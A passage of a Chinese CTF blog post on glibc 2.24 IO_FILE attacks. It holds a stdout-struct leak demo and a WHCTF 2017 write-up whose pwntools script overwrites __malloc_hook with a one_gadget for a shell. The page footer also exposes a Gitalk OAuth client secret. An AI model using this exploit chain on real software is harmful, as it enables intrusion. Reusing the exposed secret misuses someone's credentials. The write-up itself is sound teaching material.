+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span>
+
+<span class="token keyword">char</span> mybuf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//0x601100</span>
+<span class="token keyword">char</span> leakbuf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Success!!!!!!!!"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//0x601060</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>write_ptr <span class="token operator">=</span> <span class="token number">0x7ffff7dd2648</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>write_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd2650</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>write_base <span class="token operator">=</span> <span class="token number">0x7ffff7dd2640</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>fileno <span class="token operator">=</span> <span class="token number">0x7ffff7dd2690</span><span class="token punctuation">;</span>
+    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>read_end <span class="token operator">=</span> <span class="token number">0x7ffff7dd2630</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token string">"AAAAAAAAAAAAAAAAAa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span>fileno <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span>read_end <span class="token operator">=</span> <span class="token operator">*</span>write_base <span class="token operator">=</span> <span class="token operator">&amp;</span>leakbuf<span class="token punctuation">;</span>
+    <span class="token operator">*</span>write_end <span class="token operator">=</span> <span class="token operator">*</span>write_ptr <span class="token operator">=</span> <span class="token operator">&amp;</span>leakbuf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span><span class="token string">"BBBBBBBBBBBBBA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+输出：
+AAAAAAAAAAAAAAAAAaSuccess<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>BBBBBBBBBBBBBA</code></pre>
+<p>本来我是直接printf(“%s\n”,”BBBBBBBBBBBBBA”)，但是怎么什么都没输出，然后在修改结构体前先printf一次就行了。</p>
+<h2 id="WHCTF-2017-stackoverflow"><a href="#WHCTF-2017-stackoverflow" class="headerlink" title="WHCTF 2017 stackoverflow"></a>WHCTF 2017 stackoverflow</h2><h3 id="IDA–关键点"><a href="#IDA–关键点" class="headerlink" title="IDA–关键点"></a>IDA–关键点</h3><pre class=" language-c"><code class="language-c">    <span class="token comment" spellcheck="true">/*无缓冲*/</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"leave your name, bro:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">read_like</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v1<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//内部使用read函数，且未设置字符串末尾截断符，配合printf可以leak stack，leak libc</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"worrier %s, now begin your challenge"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
+<span class="token comment" spellcheck="true">/*由于设置截断符不是按照size，而是v2，且v2赋值后不再更新，所以相当于一定范围内Null字节写入*/</span>
+  v2 <span class="token operator">=</span> size<span class="token punctuation">;</span>
+ <span class="token keyword">while</span> <span class="token punctuation">(</span> size <span class="token operator">></span> <span class="token number">0x300000</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
+     <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
+ <span class="token punctuation">}</span>
+ <span class="token punctuation">[</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">]</span>
+  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>bss_ptr_chunk <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    </code></pre>
+<p>IO_getc宏的作用是刷新_IO_read_ptr，每次会从输入缓冲区读一个字节数据即将_IO_read_ptr加一，当_IO_read_ptr等于_IO_read_end的时候便会调用read读数据到_IO_buf_base地址中。</p>
+<p>这个题目libc版本是2.24的，有个比较特殊的地方：</p>
+<pre class=" language-java"><code class="language-java"><span class="token number">0x7ffff7dd48e0</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">32</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd4943</span>    <span class="token number">0x00007ffff7dd4943</span>
+<span class="token number">0x7ffff7dd48f0</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">48</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd4943</span>    <span class="token number">0x00007ffff7dd4943</span>   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>_IO_buf_base
+pwndbg<span class="token operator">></span> 
+<span class="token number">0x7ffff7dd4900</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">64</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x00007ffff7dd4944</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span>_IO_buf_end <span class="token number">0x0000000000000000</span>   
+<span class="token number">0x7ffff7dd4910</span> <span class="token operator">&lt;</span>_IO_2_1_stdin_<span class="token operator">+</span><span class="token number">80</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span></code></pre>
+<p>把_IO_buf_base最后一字节覆盖为\x00 就刚好指向_IO_buf_end （0x7ffff7dd4900 ），这样下一次scanf就可以修改_IO_buf_end。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
+<li>printf name时利用stack leak获取libc地址</li>
+<li>malloc一块很大的内存，这样进行mmap获得的空间会紧邻libc基址</li>
+<li>利用null字节写入，使_IO_buf_base指向_IO_buf_end </li>
+<li>再次进行scanf就将_IO_buf_end 修改为_malloc_hook+8，并构造payload(尽量不破坏_IO_2_1_stdin_结构体)填充_malloc_hook为onegadget</li>
+</ul>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#+++++++++++++++++++stackoverflow.py++++++++++++++++++++</span>
+<span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-                           </span>
+<span class="token comment" spellcheck="true">#Author: Squarer</span>
+<span class="token comment" spellcheck="true">#Time: Fri Nov  6 11:38:15 CST 2020</span>
+<span class="token comment" spellcheck="true">#+++++++++++++++++++stackoverflow.py++++++++++++++++++++</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+
+<span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./stackoverflow'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/glibc/x64/2.24/lib/libc-2.24.so'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>
+<span class="token comment" spellcheck="true">#libc=ELF('/lib/i386-linux-gnu/libc.so.6')</span>
+
+
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stackoverflow'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#sh = remote('ip',port)</span>
+leak_libc <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'leave your name, bro:'</span><span class="token punctuation">,</span>leak_libc<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+libc_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_file_jumps'</span><span class="token punctuation">]</span>
+IO_stdin <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>
+malloc_hook <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
+onegad <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x3f4b6</span><span class="token punctuation">,</span><span class="token number">0x3f50a</span><span class="token punctuation">,</span><span class="token number">0xd6635</span><span class="token punctuation">]</span>
+onegadget <span class="token operator">=</span> libc_addr <span class="token operator">+</span> onegad<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_addr:"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"IO_stdin:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>IO_stdin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'malloc_hook:'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget:'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'trigger stackoverflow: '</span><span class="token punctuation">,</span><span class="token string">'5871848'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'trigger stackoverflow: '</span><span class="token punctuation">,</span><span class="token string">'2097152'</span><span class="token punctuation">)</span>
+offset <span class="token operator">=</span> <span class="token number">56</span>
+target_addr <span class="token operator">=</span> IO_stdin <span class="token operator">+</span> offset
+ptr2_mma <span class="token operator">=</span> libc_addr <span class="token operator">-</span> <span class="token number">0x201000</span> <span class="token operator">+</span> <span class="token number">0x10</span>
+offi_mma_tar <span class="token operator">=</span> target_addr <span class="token operator">-</span> ptr2_mma
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'target_addr:'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"ptr2_mma:"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ptr2_mma<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'offi_mma_tar:'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>offi_mma_tar<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ropchain: '</span><span class="token punctuation">,</span><span class="token string">'AAA'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(sh,'b*0x00000000004008E9')</span>
+sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'trigger stackoverflow: '</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'ropchain: '</span><span class="token punctuation">,</span><span class="token string">'AAA'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#这是IO_getc宏的原因，调试</span>
+    sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'ropchain: '</span><span class="token punctuation">,</span><span class="token string">'X'</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+
+payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xa000000</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_addr<span class="token operator">+</span><span class="token number">0x39a770</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#local off</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_addr<span class="token operator">+</span><span class="token number">0x3989a0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_file_jumps'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x2a</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400A23</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(sh,'b*0x0000000000400888')</span>
+sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'trigger stackoverflow: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h2 id="IO攻击常见问题"><a href="#IO攻击常见问题" class="headerlink" title="IO攻击常见问题"></a>IO攻击常见问题</h2><p>在构造好各个结构体之后，触发攻击不一定能获得shell，一般的：</p>
+<blockquote>
+<p>必须要libc的低32位地址为负时，攻击才会成功。<br>在fflush函数的检查里，它第二步才是跳转，第一步的检查，在arena里的伪造file结构中这两个值，绝对值一定可以通过，那么就会直接执行虚表函数。所以只有为负时，才会check失效</p>
+</blockquote>
+<p>参考：<br><a href="https://elixir.bootlin.com/glibc/glibc-2.24/source" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.24/source</a><br><a href="https://www.anquanke.com/post/id/168802#h3-6" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168802#h3-6</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/#_2" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/#_2</a><br><a href="https://shizhongpwn.github.io/2020/02/10/io-gong-ji-zong-jie/" target="_blank" rel="noopener">https://shizhongpwn.github.io/2020/02/10/io-gong-ji-zong-jie/</a><br><a href="https://b0ldfrev.gitbook.io/note/pwn/iofile-li-yong-si-lu-zong-jie" target="_blank" rel="noopener">https://b0ldfrev.gitbook.io/note/pwn/iofile-li-yong-si-lu-zong-jie</a><br><a href="https://xz.aliyun.com/t/5853#toc-5（推荐" target="_blank" rel="noopener">https://xz.aliyun.com/t/5853#toc-5（推荐</a> ）<br><a href="https://www.anquanke.com/post/id/194577#h3-3（推荐）" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194577#h3-3（推荐）</a></p>
+
+            </div>
+            <hr/>
+
+            
+            <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.88rem;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff;
+        background-color: #22AB38;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff;
+        background-color: #019FE8;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a class="reward-link btn-floating btn-large waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close"><i class="fa fa-close"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs">
+                        <li class="tab wechat-tab waves-effect waves-light"><a class="active" href="#wechat">微信</a></li>
+                        <li class="tab alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                    </ul>
+                    <div id="wechat">
+                        <img src="/medias/reward/1.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                    <div id="alipay">
+                        <img src="/medias/reward/2.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('#reward .reward-link').on('click', function () {
+            $('#rewardModal').openModal();
+        });
+
+        $('#rewardModal .close').on('click', function () {
+            $('#rewardModal').closeModal();
+        });
+    });
+</script>
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/11/07/io-file-glibc2-24/" class="b-link-green">IO_FILE --glibc2.24</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
+<link rel="stylesheet" href="/css/my-gitalk.css">
+
+<div class="card gitalk-card" data-aos="fade-up">
+    <div id="gitalk-container" class="card-content"></div>
+</div>
+
+<script src="/libs/gitalk/gitalk.min.js"></script>
+<script>
+    let gitalk = new Gitalk({
+        clientID: 'aa0bf75cc88de6c0258a',
+        clientSecret: '8ddc9bf71af314ac63d189a5ecb132fac7c0687d',
+        repo: 'Gitalks.github.io',
+        owner: 'squarepants0',
+        admin: "squarepants0",
+        id: '2020-11-07T17-19-52',
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    });
+
+    gitalk.render('gitalk-container');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/11/07/io-file-glibc2-24/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="IO_FILE --glibc2.24">
+                        
+                        <span class="card-title">IO_FILE --glibc2.24</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">FSOP
+在新版本的 glibc 中 (2.24)，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。如果 vtable 是非法的，那么会引发 a</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF-PWN/" class="post-category" target="_blank">
+                                    CTF-PWN
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/" target="_blank">
+                        <span class="chip bg-color">原理学习</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/11/05/test/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="test">
+                        
+                        <span class="card-title">test</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">asdddddddddddddddddddddddd
+</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/TEST/" class="post-category" target="_blank">
+                                    TEST
+                                </a>
+                            
+                            <a href="/categories/TEST/TEST/" class="post-category" target="_blank">
+                                    TEST
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/test/" target="_blank">
+                        <span class="chip bg-color">test</span>
+                    </a>
+                    
+                    <a href="/tags/test1/" target="_blank">
+                        <span class="chip bg-color">test1</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('10')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Matrix<br />'
+            + '作者: IT YUAN<br />'
+            + '链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者Matrix所有，任何形式的转载都请注明出处：https://squarepants0.github.io/。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
